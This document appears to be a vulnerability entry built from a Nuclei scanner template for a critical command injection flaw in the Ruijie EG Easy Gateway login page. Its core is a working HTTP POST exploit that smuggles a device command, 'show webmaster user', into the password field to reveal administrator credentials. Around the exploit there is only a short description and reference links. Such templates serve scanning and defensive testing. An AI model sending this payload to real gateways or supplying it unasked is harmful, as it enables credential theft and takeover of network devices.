# Nuclei Template: Ruijie EG Easy Gateway - Remote Command Execution
**Template ID:** ruijie-eg-login-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`ruijie-eg-login-rce.yaml`)

## Vulnerability Information & PoC

## Description
Ruijie EG Easy Gateway login.php has remote commmand execution vulnerability, which can lead to the disclosure of administrator account and password.

## Steps to reproduce / Exploit Payload
```http
POST /login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin?show+webmaster+user
```

## References
- http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
- https://www.ruijienetworks.com
